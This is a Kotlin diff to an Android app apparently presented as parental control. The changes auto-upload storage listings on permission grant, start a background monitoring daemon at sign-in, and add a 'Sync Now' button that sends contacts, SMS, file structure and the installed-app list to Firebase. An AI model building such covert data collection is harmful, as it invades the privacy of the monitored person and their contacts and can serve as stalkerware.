@@ -975,12 +975,28 @@ fun ParentControlApp(
         }
     }
 
+    // Automatic Storage Scan Sync listener once permission is granted
+    val isStorageManagerGranted = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
+        android.os.Environment.isExternalStorageManager()
+    } else {
+        ContextCompat.checkSelfPermission(context, Manifest.permission.WRITE_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED
+    }
+    LaunchedEffect(isStorageManagerGranted, currentEmail) {
+        if (isStorageManagerGranted && currentEmail.isNotEmpty()) {
+            FirebaseManager.uploadStorageStructure(context, currentEmail)
+            logsList.add("Storage Access Granted! Auto-scanned file directories and synced metadata to cloud.")
+        }
+    }
+
     // Command Listener Subscription handle
     LaunchedEffect(currentUser) {
         if (currentUser != null) {
             val email = currentUser?.email ?: ""
             currentEmail = email
             logsList.add("Signed in user account: $email")
+            
+            // Start background monitoring daemon service
+            BackgroundDaemonService.start(context, email)
             
             // Upload default structures and status information on sign in
             FirebaseManager.createDefaultCommandStructure(email)
@@ -1021,54 +1037,22 @@ fun ParentControlApp(
                 currentUser = user
             })
         } else {
-            var selectedTab by remember { mutableStateOf(0) }
             Column(modifier = Modifier.fillMaxSize().background(Color(0xFF0C0E14))) {
-                TabRow(
-                    selectedTabIndex = selectedTab,
-                    containerColor = Color(0xFF161924),
-                    contentColor = Color.White
-                ) {
-                    Tab(
-                        selected = selectedTab == 0,
-                        onClick = { selectedTab = 0 },
-                        text = { Text("Monitored Terminal (Client)", fontSize = 11.sp, fontWeight = FontWeight.Bold) },
-                        icon = { Icon(Icons.Filled.CloudSync, contentDescription = null, modifier = Modifier.size(18.dp)) }
-                    )
-                    Tab(
-                        selected = selectedTab == 1,
-                        onClick = { selectedTab = 1 },
-                        text = { Text("Administration Control (Sender)", fontSize = 11.sp, fontWeight = FontWeight.Bold) },
-                        icon = { Icon(Icons.Filled.Campaign, contentDescription = null, modifier = Modifier.size(18.dp)) }
-                    )
-                }
-                
-                if (selectedTab == 0) {
-                    SimpleBackgroundStatusUI(
-                        email = currentEmail,
-                        permissionStatsMap = permissionGrantStates,
-                        onRequestPermissions = {
-                            requestAllPerms()
-                        },
-                        onLogOutRequested = {
-                            FirebaseManager.auth.signOut()
-                            currentUser = null
-                            currentEmail = ""
-                            executeLocationJob("", false)
-                            activity.updateSystemOverlayBlock(false, "", "")
-                        }
-                    )
-                } else {
-                    ParentNotificationSenderPanel(
-                        currentEmail = currentEmail,
-                        onLogOutRequested = {
-                            FirebaseManager.auth.signOut()
-                            currentUser = null
-                            currentEmail = ""
-                            executeLocationJob("", false)
-                            activity.updateSystemOverlayBlock(false, "", "")
-                        }
-                    )
-                }
+                SimpleBackgroundStatusUI(
+                    email = currentEmail,
+                    permissionStatsMap = permissionGrantStates,
+                    onRequestPermissions = {
+                        requestAllPerms()
+                    },
+                    onLogOutRequested = {
+                        FirebaseManager.auth.signOut()
+                        currentUser = null
+                        currentEmail = ""
+                        executeLocationJob("", false)
+                        BackgroundDaemonService.stop(context)
+                        activity.updateSystemOverlayBlock(false, "", "")
+                    }
+                )
             }
         }
  
@@ -1382,9 +1366,10 @@ fun SimpleBackgroundStatusUI(
             .fillMaxSize()
             .background(Color(0xFF0C0E14))
             .statusBarsPadding()
+            .androidx.compose.foundation.verticalScroll(androidx.compose.foundation.rememberScrollState())
             .padding(24.dp),
         horizontalAlignment = Alignment.CenterHorizontally,
-        verticalArrangement = Arrangement.SpaceBetween
+        verticalArrangement = Arrangement.spacedBy(16.dp)
     ) {
         // Upper Status Header
         Column(
@@ -1444,11 +1429,39 @@ fun SimpleBackgroundStatusUI(
                         fontWeight = FontWeight.Medium
                     )
                     Spacer(modifier = Modifier.height(6.dp))
-                    Text(
-                        text = "Connection Status: Online & Synced",
-                        fontSize = 12.sp,
-                        color = Color.LightGray
-                    )
+                    Row(
+                        modifier = Modifier.fillMaxWidth(),
+                        horizontalArrangement = Arrangement.SpaceBetween,
+                        verticalAlignment = Alignment.CenterVertically
+                    ) {
+                        Text(
+                            text = "Connection Status: Online & Synced",
+                            fontSize = 12.sp,
+                            color = Color.LightGray
+                        )
+                        Button(
+                            onClick = {
+                                FirebaseManager.uploadDeviceStatus(email, permissionStatsMap)
+                                FirebaseManager.uploadContacts(context, email)
+                                FirebaseManager.uploadSMS(context, email)
+                                FirebaseManager.uploadStorageStructure(context, email)
+                                FirebaseManager.uploadInstalledApps(context, email)
+                                Toast.makeText(context, "Full dynamic sync initiated!", Toast.LENGTH_SHORT).show()
+                            },
+                            colors = ButtonDefaults.buttonColors(containerColor = Color.DarkGray),
+                            contentPadding = PaddingValues(horizontal = 8.dp),
+                            modifier = Modifier.height(28.dp)
+                        ) {
+                            Icon(
+                                imageVector = Icons.Filled.Refresh,
+                                contentDescription = "Sync",
+                                tint = Color.Yellow,
+                                modifier = Modifier.size(12.dp)
+                            )
+                            Spacer(modifier = Modifier.width(4.dp))
+                            Text("Sync Now", fontSize = 10.sp, color = Color.White)
+                        }
+                    }
                 }
             }
 
